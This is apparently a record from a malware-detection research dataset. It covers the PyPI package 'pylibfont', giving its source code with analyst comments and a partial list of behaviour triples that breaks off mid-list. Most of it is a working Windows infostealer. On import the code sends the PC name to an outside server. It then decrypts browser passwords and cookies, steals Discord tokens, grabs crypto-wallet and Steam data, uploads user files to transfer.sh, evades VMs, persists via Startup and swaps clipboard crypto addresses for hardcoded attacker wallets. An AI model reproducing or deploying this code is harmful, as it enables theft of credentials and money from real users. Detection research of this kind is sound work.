{
  "metadata": {
    "package_name": "pylibfont-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/pylibfont-0.1.0-py3-none-any.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pylibfont-0.1.0-py3-none-any/pylibfont/__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Install dependencies (suspicious, but not directly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Initial exfiltration of PC username to C2\nhttpx.post(\"https://realbatman.com/\", json={\n    'embeds': [{\n        \"title\": \"Someone Tried to download\",\n        \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n    }]\n})\n\n# Malicious configuration (webhook, crypto addresses, anti-debug lists)\n__config__ = {\n    'yourwebhookurl': \"https://realbatman.com/\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qmaq4andvksy4xsj0pfjpk532wcagadv8vy0wr5',\n    'addresse_eth': '0xcDa3FA41B744af5A35050605BC0CAcB44fF134aB',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '44phaq945CMXQFBujAz9dpEX4Y9Sw5KvBf9iVq1k49cQdJEk77rneek1cPXdCxumP9SboX2xxpGZ5YM8aYecxLyP4r7dhZe',\n    'addresse_ada': 'addr1qytkh6faxr0mgx3a2eqn2q2jy2y88nvwmxscggxcaap5m7chd05n6vxlksdr64jpx5q4yg5gw0xcakdpsssd3m6rfhas25qwp6',\n    'addresse_dash': 'XqXv3CxEzYcTfT5Nx6zn7ZZpXHBnTLGJP5',\n    'blprggg': [ ... ] # anti-debug/VM/process blacklist\n}\n\n# Malicious class: clipboard crypto address stealer\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto regexes)\n        except:\n            pass\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# Malicious class: main stealer logic\nclass bc_initial_func:\n    def __init__(self):\n        # ...\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        # ...\n        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, \"Local State\"))\n        os.makedirs(self.dir, exist_ok=True)\n    def startupkekw(self):\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n    async def bypass_tokenprtct(self):\n        tp = f\"{self.roaming}\\\\DiscordTokenProtector\\\\\"\n        if not ntpath.exists(tp):\n            return\n        config = tp + \"config.json\"\n        for i in [\"DiscordTokenProtector.exe\", \"ProtectionPayload.dll\", \"secure.dat\"]:\n            try:\n                os.remove(tp + i)\n            except FileNotFoundError:\n                pass\n        if ntpath.exists(config):\n            with open(config, errors=\"ignore\") as f:\n                try:\n                    item = json.load(f)\n                except json.decoder.JSONDecodeError:\n                    return\n                item['kekw_is_here'] = \"https://kekwltd.ru\"\n                item['auto_start'] = False\n                item['auto_start_discord'] = False\n                item['integrity'] = False\n                item['integrity_allowbetterdiscord'] = False\n                item['integrity_checkexecutable'] = False\n                item['integrity_checkhash'] = False\n                item['integrity_checkmodule'] = False\n                item['integrity_checkscripts'] = False\n                item['integrity_checkresource'] = False\n                item['integrity_redownloadhashes'] = False\n                item['iterations_iv'] = 364\n                item['iterations_key'] = 457\n                item['version'] = 69420\n            with open(config, 'w') as f:\n                json.dump(item, f, indent=2, sort_keys=True)\n            with open(config, 'a') as f:\n                f.write(\"\\n\\n//KEKWLTD | https://kekwltd.ru\")\n    async def kill_process_id(self):\n        bllist = __config__['blprggg']\n        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:\n            bllist.append(i)\n        for proc in psutil.process_iter():\n            if any(procstr in proc.name().lower() for procstr in bllist):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    async def bypass_bttdsc(self):\n        bd = self.roaming + \"\\\\BetterDiscord\\\\data\\\\betterdiscord.asar\"\n        if ntpath.exists(bd):\n            x = self.regex_webhook_dsc\n            with open(bd, 'r', encoding=\"cp437\", errors='ignore') as f:\n                txt = f.read()\n                content = txt.replace(x, 'kekwltd')\n            with open(bd, 'w', newline='', encoding=\"cp437\", errors='ignore') as f:\n                f.write(content)\n    def steal_token(self):\n        # Steals Discord tokens from various browsers and verifies them\n        # ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.bc_id:\n                                        self.tokens.append(token)\n                                        self.bc_id.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.bc_id:\n                                    self.tokens.append(token)\n                                    self.bc_id.append(uid)\n        # ...\n    def natify_matched_tokens(self):\n        # Exfiltrates found Discord tokens and user info to webhook\n        f = open(self.dir + \"\\\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore')\n        for token in self.tokens:\n            j = httpx.get(self.dscap1, headers=self.g3t_H(token)).json()\n            user = j.get('username') + '#' + str(j.get(\"discriminator\"))\n            # ...\n            f.write(f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\")\n        f.close()\n    def finished_bc(self):\n        # Zips all stolen data and exfiltrates to webhook\n        for i in os.listdir(self.dir):\n            if i.endswith('.txt'):\n                path = self.dir + self.sep + i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        ff.close()\n                        os.remove(path)\n                    else:\n                        with open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                            f.write(\"KEKWLTD | https://kekwltd.ru\\n\\n\")\n                        with open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\") as fp:\n                            fp.write(x + \"\\n\\nKEKWLTD | https://kekwltd.ru\")\n        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        # ...\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# Malicious anti-debug/VM detection\nclass NoDebugg:\n    inVM = False\n    def __init__(self):\n        self.processes = list()\n        self.bluseurs = [ ... ]\n        self.blpcname = [ ... ]\n        self.blhwid = [ ... ]\n        self.blips = [ ... ]\n        for func in [self.lstchec, self.regkey, self.sp3cCheq]:\n            process = threading.Thread(target=func, daemon=True)\n            self.processes.append(process)\n            process.start()\n        for t in self.processes:\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n    def programExit(self):\n        self.__class__.inVM = True\n    def lstchec(self):\n        for path in [r'D:\\Tools', r'D:\\OS2', r'D:\\NT3X']:\n            if ntpath.exists(path):\n                self.programExit()\n        for user in self.bluseurs:\n            if infocom == user:\n                self.programExit()\n        for pcName in self.blpcname:\n            if vctm_pc == pcName:\n                self.programExit()\n        for pcIP in self.blips:\n            if self.net_1fo()[0] == pcIP:\n                self.programExit()\n        for uuidwndz in self.blhwid:\n            if self.sys_1fo()[0] == uuidwndz:\n                self.programExit()\n    def sp3cCheq(self):\n        if int(r4m) <= 3: \n            self.programExit()\n        if int(d1sk) <= 120:  \n            self.programExit()\n        if int(psutil.cpu_count()) <= 1:\n            self.programExit()\n    def regkey(self):\n        reg1 = os.system(\"REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\DriverDesc 2> nul\")\n        reg2 = os.system(\"REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\ProviderName 2> nul\")\n        if (reg1 and reg2) != 1:\n            self.programExit()\n        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum')\n        try:\n            reg_val = winreg.QueryValueEx(handle, '0')[0]\n            if (\"VMware\" or \"VBOX\") in reg_val:\n                self.programExit()\n        finally:\n            winreg.CloseKey(handle)\n\n# Malicious main execution\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# --- SECONDARY STEALER/EXFIL CODE ---\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\ndef fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)\nhook = fetch_conf(\"yourwebhookurl\")\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\",listt)\n    while \"https\" in e: e.remove(\"https\")\n    while \"com\" in e: e.remove(\"com\")\n    while \"net\" in e: e.remove(\"net\")\n    return list(set(e))\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    if \"bc_allpasswords\" in name:\n        ra = ' | '.join(da for da in paswWords)\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = ' | '.join(da for da in rrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Passwords Found:\",\n                \"value\": ra\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = ' | '.join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = ' | '.join(da for da in rrrrr)\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Cookies Found:\",\n                \"value\": rb\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\",\n            },\n            'color': 374276,\n            }\n        ],\n         \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n    LoadRequests(\"POST\", hook, files=files)\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(f\"KEKWLTD | https://kekwltd.ru\\n\\n\")\n        for line in data:\n            if line[0] != '':\n                f.write(f\"{line}\\n\")\nPassw = []\ndef getPassw(path, arg):\n    global Passw\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    writeforfile(Passw, 'bc_allpasswords')\nCookies = []\ndef getCookie(path, arg):\n    global Cookies\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\"{row[0]}\\tTRUE\"+\"\\t\\t\"+ f\"/FALSE\\t2597573456\\t{row[1]}\\t{DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\ndef checkIfProcessRunning(processName):\n    for proc in psutil.process_iter():\n        try:\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False;\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC): return\n    if checkIfProcessRunning('chrome.exe'):\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef grabb_GatherAll():\n    browserPaths = [ ... ]\n    Paths_zipped = [ ... ]\n    for patt in browserPaths:\n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\nbc_create_files = []\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()",
          "triple_sequences": [
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install requests httpx",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install multiple Python packages",
              "intention_id": "install_multiple_python_packages"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://realbatman.com/",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Send PC username to remote server",
              "intention_id": "send_username_server"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^0x[a-fA-F0-9]{40}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_eth",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "startup_path + argv[0]",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
